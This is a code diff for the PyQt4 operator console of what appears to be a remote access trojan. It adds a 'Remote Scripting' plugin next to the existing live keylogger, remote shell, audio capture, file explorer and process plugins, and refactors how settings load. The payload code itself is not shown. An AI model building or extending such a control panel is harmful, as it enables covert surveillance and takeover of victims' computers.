@@ -8,25 +8,26 @@ import ast
 import zlib
 import threading
 import hashlib
-import Image
-import ImageQt
 import string
 import random
 from threading import Thread
-from libs import pygeoip
 
+import Image
+import ImageQt
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
+from libs import pygeoip
 from ui import gui
-from settings import Config
-
+from libs.settings import Config, Settings
 from libs.modechat import get, send
 from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
 from plugins.mkeylogger import main as mkeylogger
 from plugins.mprocesses import main as mprocesses
+from plugins.mscript import main as mscript
+
 
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
@@ -65,17 +66,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.settings = Config()
 
         # set settings
-        try:
-            self.IPADDRESS = self.settings.ip_address
-            self.PORT = self.settings.port
-            self.MAXCONNECTIONS = self.settings.max_connections
-            self.TIMEOUT = self.settings.timeout
-        except AttributeError:
-            self.settings = Config()
-            self.IPADDRESS = self.settings.ip_address
-            self.PORT = self.settings.port
-            self.MAXCONNECTIONS = self.settings.max_connections
-            self.TIMEOUT = self.settings.timeout
+        self.update_settings()
 
         # update gui
         self.gui = QApplication.processEvents
@@ -98,6 +89,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteAudioButton.setDisabled(True)
         self.remoteKeyloggerButton.setDisabled(True)
         self.remoteProcessesButton.setDisabled(True)
+        self.remoteScriptingButton.setDisabled(True)
         self.lockServerButton.setDisabled(True)
         self.lockServerButton.setVisible(False)
         self.quitServerButton.setDisabled(True)
@@ -129,6 +121,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Triggers
         self.startListenButton.clicked.connect(self.listen_start)
         self.stopListenButton.clicked.connect(self.listen_stop)
+        self.clientSettingsButton.clicked.connect(self.run_settings)
         self.serversTable.clicked.connect(self.update_preview)
 
         # Panel Triggers
@@ -140,7 +133,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.remoteExplorerButton.clicked.connect(lambda: self.run_plugin('explorerMode'))
         self.remoteAudioButton.clicked.connect(lambda: self.run_plugin('audioMode'))
         self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
+        self.remoteScriptingButton.clicked.connect(lambda: self.run_plugin('scriptingMode'))
         self.remoteProcessesButton.clicked.connect(lambda: self.run_plugin('processesMode'))
+
+        # menu triggers
+        self.actionStartListen_for_connections.triggered.connect(self.listen_start)
+        self.actionStopListen_for_connections.triggered.connect(self.listen_stop)
+        self.actionClient_Configuration.triggered.connect(self.run_settings)
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -149,10 +148,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_plugin(plugin='explorer'))
         self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_plugin(plugin='audio'))
         self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_plugin(plugin='keylogger'))
+        self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
         self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))
 
     # Start Listen for Servers
     def listen_start(self):
+        # update settings
+        self.update_settings()
+        self.portLabel.setText(str(self.PORT))
+
         # Initializing variables
         if not self.acceptthreadState:
             self.socks = {}
@@ -396,6 +400,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(True)
                 self.remoteAudioButton.setDisabled(True)
                 self.remoteKeyloggerButton.setDisabled(True)
+                self.remoteScriptingButton.setDisabled(True)
                 self.remoteProcessesButton.setDisabled(True)
                 self.lockServerButton.setVisible(False)
                 self.lockServerButton.setDisabled(True)
@@ -405,6 +410,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.remoteShellButton.setDisabled(False)
                 self.remoteAudioButton.setDisabled(False)
                 self.remoteKeyloggerButton.setDisabled(False)
+                self.remoteScriptingButton.setDisabled(False)
                 self.remoteProcessesButton.setDisabled(False)
                 self.lockServerButton.setVisible(True)
                 self.lockServerButton.setDisabled(False)
@@ -417,6 +423,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.remoteShellButton.setDisabled(True)
             self.remoteAudioButton.setDisabled(True)
             self.remoteKeyloggerButton.setDisabled(True)
+            self.remoteScriptingButton.setDisabled(True)
             self.remoteProcessesButton.setDisabled(True)
             self.lockServerButton.setVisible(False)
             self.lockServerButton.setDisabled(True)
@@ -444,6 +451,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       lambda: self.run_plugin('audioMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
                                       lambda: self.run_plugin('keyloggerMode'))
+                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
+                                      lambda: self.run_plugin('scriptingMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
                                       lambda: self.run_plugin('processesMode'))
 
@@ -470,7 +479,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorerMode': 'executeExplorer()',
             'audioMode': 'executeAudio()',
             'keyloggerMode': 'executeKeylogger()',
-            'processesMode': 'executeProcesses()'
+            'scriptingMode': 'executeScripting()',
+            'processesMode': 'executeProcesses()',
         }
         if signal in signals:
             self.current_sock = sock
@@ -482,7 +492,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'explorer': mexplorer,
             'audio': maudio,
             'keylogger': mkeylogger,
-            'processes': mprocesses
+            'scripting': mscript,
+            'processes': mprocesses,
         }
 
         server = self.current_server()
@@ -502,6 +513,17 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         server = self.current_server()
         if server:
             send(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)
+
+    def update_settings(self):
+        self.settings = Config()
+        self.IPADDRESS = self.settings.ip_address
+        self.PORT = self.settings.port
+        self.MAXCONNECTIONS = self.settings.max_connections
+        self.TIMEOUT = self.settings.timeout
+
+    def run_settings(self):
+        self.settings_form = Settings()
+        self.settings_form.show()
 
     def closeEvent(self, event):
         sys.exit(1)
